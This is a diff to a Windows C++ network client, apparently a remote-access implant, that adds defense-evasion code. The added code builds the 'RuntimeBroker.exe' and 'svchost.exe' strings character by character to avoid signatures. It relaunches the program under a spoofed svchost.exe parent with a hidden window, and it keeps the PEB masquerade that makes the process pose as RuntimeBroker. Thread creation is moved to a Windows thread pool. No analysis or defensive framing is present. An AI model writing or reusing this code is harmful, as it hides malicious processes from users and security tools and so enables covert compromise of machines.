@@ -8,6 +8,7 @@
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <winternl.h>
+#include <tlhelp32.h>
 #include <string>
 #include <cmath>
 #include <cstdio>
@@ -175,6 +176,9 @@ static char g_wndClass[16];
 static char g_menuTitle[48];
 static char g_statusOk[32];
 static char g_statusBad[32];
+static wchar_t g_fakePath[48];
+static wchar_t g_fakeCmd[24];
+static wchar_t g_svcName[16];
 
 #pragma optimize("", off)
 static void initRuntimeStrings()
@@ -206,6 +210,23 @@ static void initRuntimeStrings()
 	*p++='C'; *p++='o'; *p++='n'; *p++='n'; *p++='e'; *p++='c'; *p++='t'; *p++='i'; *p++='n'; *p++='g';
 	*p++='.'; *p++='.'; *p++='.';
 	*p = 0;
+
+	wchar_t* wp;
+	wp = g_fakePath;
+	*wp++='C'; *wp++=':'; *wp++='\\'; *wp++='W'; *wp++='i'; *wp++='n'; *wp++='d'; *wp++='o'; *wp++='w'; *wp++='s';
+	*wp++='\\'; *wp++='S'; *wp++='y'; *wp++='s'; *wp++='t'; *wp++='e'; *wp++='m'; *wp++='3'; *wp++='2';
+	*wp++='\\'; *wp++='R'; *wp++='u'; *wp++='n'; *wp++='t'; *wp++='i'; *wp++='m'; *wp++='e';
+	*wp++='B'; *wp++='r'; *wp++='o'; *wp++='k'; *wp++='e'; *wp++='r'; *wp++='.'; *wp++='e'; *wp++='x'; *wp++='e';
+	*wp = 0;
+
+	wp = g_fakeCmd;
+	*wp++='R'; *wp++='u'; *wp++='n'; *wp++='t'; *wp++='i'; *wp++='m'; *wp++='e';
+	*wp++='B'; *wp++='r'; *wp++='o'; *wp++='k'; *wp++='e'; *wp++='r'; *wp++='.'; *wp++='e'; *wp++='x'; *wp++='e';
+	*wp = 0;
+
+	wp = g_svcName;
+	*wp++='s'; *wp++='v'; *wp++='c'; *wp++='h'; *wp++='o'; *wp++='s'; *wp++='t'; *wp++='.'; *wp++='e'; *wp++='x'; *wp++='e';
+	*wp = 0;
 }
 
 static void masqueradePEB()
@@ -222,16 +243,96 @@ static void masqueradePEB()
 	PEB* peb = pbi.PebBaseAddress;
 	if (!peb || !peb->ProcessParameters) return;
 
-	static wchar_t fakePath[] = L"C:\\Windows\\System32\\RuntimeBroker.exe";
-	static wchar_t fakeCmd[]  = L"RuntimeBroker.exe";
-	peb->ProcessParameters->ImagePathName.Buffer = fakePath;
-	peb->ProcessParameters->ImagePathName.Length = (USHORT)(wcslen(fakePath) * sizeof(wchar_t));
-	peb->ProcessParameters->ImagePathName.MaximumLength = sizeof(fakePath);
-	peb->ProcessParameters->CommandLine.Buffer = fakeCmd;
-	peb->ProcessParameters->CommandLine.Length = (USHORT)(wcslen(fakeCmd) * sizeof(wchar_t));
-	peb->ProcessParameters->CommandLine.MaximumLength = sizeof(fakeCmd);
+	peb->ProcessParameters->ImagePathName.Buffer = g_fakePath;
+	peb->ProcessParameters->ImagePathName.Length = (USHORT)(wcslen(g_fakePath) * sizeof(wchar_t));
+	peb->ProcessParameters->ImagePathName.MaximumLength = sizeof(g_fakePath);
+	peb->ProcessParameters->CommandLine.Buffer = g_fakeCmd;
+	peb->ProcessParameters->CommandLine.Length = (USHORT)(wcslen(g_fakeCmd) * sizeof(wchar_t));
+	peb->ProcessParameters->CommandLine.MaximumLength = sizeof(g_fakeCmd);
+}
+
+static void respawnUnderSvchost()
+{
+	DWORD myPid = GetCurrentProcessId();
+	DWORD parentPid = 0;
+
+	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (snap == INVALID_HANDLE_VALUE) return;
+
+	PROCESSENTRY32W pe = {};
+	pe.dwSize = sizeof(pe);
+	if (Process32FirstW(snap, &pe)) {
+		do {
+			if (pe.th32ProcessID == myPid) {
+				parentPid = pe.th32ParentProcessID;
+				break;
+			}
+		} while (Process32NextW(snap, &pe));
+	}
+
+	if (parentPid) {
+		pe.dwSize = sizeof(pe);
+		if (Process32FirstW(snap, &pe)) {
+			do {
+				if (pe.th32ProcessID == parentPid &&
+					_wcsicmp(pe.szExeFile, g_svcName) == 0) {
+					CloseHandle(snap);
+					return;
+				}
+			} while (Process32NextW(snap, &pe));
+		}
+	}
+
+	DWORD svcPid = 0;
+	pe.dwSize = sizeof(pe);
+	if (Process32FirstW(snap, &pe)) {
+		do {
+			if (_wcsicmp(pe.szExeFile, g_svcName) == 0) {
+				svcPid = pe.th32ProcessID;
+				break;
+			}
+		} while (Process32NextW(snap, &pe));
+	}
+	CloseHandle(snap);
+
+	if (!svcPid) return;
+
+	HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, svcPid);
+	if (!hParent) return;
+
+	SIZE_T attrSize = 0;
+	InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
+	auto attrs = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
+	if (!attrs) { CloseHandle(hParent); return; }
+	InitializeProcThreadAttributeList(attrs, 1, 0, &attrSize);
+	UpdateProcThreadAttribute(attrs, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+		&hParent, sizeof(hParent), NULL, NULL);
+
+	STARTUPINFOEXA si = {};
+	si.StartupInfo.cb = sizeof(si);
+	si.lpAttributeList = attrs;
+	PROCESS_INFORMATION pi = {};
+
+	char cmdBuf[MAX_PATH * 2];
+	strncpy_s(cmdBuf, GetCommandLineA(), sizeof(cmdBuf) - 1);
+
+	if (CreateProcessA(NULL, cmdBuf, NULL, NULL, FALSE,
+		EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
+		NULL, NULL, &si.StartupInfo, &pi))
+	{
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+	}
+
+	DeleteProcThreadAttributeList(attrs);
+	HeapFree(GetProcessHeap(), 0, attrs);
+	CloseHandle(hParent);
+	ExitProcess(0);
 }
 #pragma optimize("", on)
+
+static DWORD WINAPI dataWorker(LPVOID) { dataThread(); return 0; }
+static DWORD WINAPI configWorker(LPVOID) { configThread(); return 0; }
 
 // ============ JSON HELPERS ============
 
@@ -840,8 +941,9 @@ int main(int argc, char* argv[])
 	if (argc >= 2) strncpy_s(g_serverIP, argv[1], sizeof(g_serverIP) - 1);
 	if (argc >= 3) g_serverPort = atoi(argv[2]);
 
-	FreeConsole();
 	initRuntimeStrings();
+	respawnUnderSvchost();
+	FreeConsole();
 	masqueradePEB();
 
 	WSADATA wsa;
@@ -898,10 +1000,8 @@ int main(int argc, char* argv[])
 		DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
 		CLEARTYPE_QUALITY, DEFAULT_PITCH, "Segoe UI");
 
-	std::thread t1(dataThread);
-	std::thread t2(configThread);
-	t1.detach();
-	t2.detach();
+	QueueUserWorkItem(dataWorker, NULL, WT_EXECUTELONGFUNCTION);
+	QueueUserWorkItem(configWorker, NULL, WT_EXECUTELONGFUNCTION);
 
 	while (g_running) {
 		MSG msg;
